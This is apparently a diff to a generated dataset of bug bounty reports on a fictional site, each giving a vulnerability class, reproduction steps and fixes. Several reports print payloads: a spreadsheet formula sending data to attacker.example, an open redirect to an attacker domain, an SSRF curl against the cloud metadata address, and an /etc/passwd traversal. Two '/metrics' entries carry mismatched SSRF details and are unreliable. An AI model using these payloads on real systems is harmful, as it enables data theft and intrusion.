+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4106,7 +4136,8 @@
           "offset": "11d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4221,7 +4252,8 @@
           "offset": "2d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4352,7 +4384,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4508,7 +4541,8 @@
           "offset": "6d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4663,7 +4697,8 @@
           "offset": "8d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4787,7 +4822,8 @@
           "offset": "3d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4893,7 +4929,8 @@
           "offset": "23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5033,7 +5070,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5189,7 +5227,8 @@
           "offset": "4d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5316,7 +5355,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5440,7 +5480,8 @@
           "offset": "2d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5548,7 +5589,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5704,7 +5746,8 @@
           "offset": "7d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5864,7 +5907,8 @@
           "offset": "5d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6016,7 +6060,8 @@
           "offset": "3d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6151,7 +6196,8 @@
           "offset": "9d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6291,7 +6337,8 @@
           "offset": "5d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6410,7 +6457,8 @@
           "offset": "1d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6573,7 +6621,8 @@
           "offset": "9d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6703,7 +6752,8 @@
           "offset": "1d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6858,7 +6908,8 @@
           "offset": "2d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6990,7 +7041,8 @@
           "offset": "3d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7086,7 +7138,8 @@
           "offset": "3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7193,7 +7246,8 @@
           "offset": "1d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7292,7 +7346,8 @@
           "offset": "8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7443,7 +7498,8 @@
           "offset": "2d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7540,7 +7596,8 @@
           "offset": "23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7629,7 +7686,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7736,7 +7794,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7864,7 +7923,8 @@
           "offset": "6d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8033,7 +8093,8 @@
           "offset": "7d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
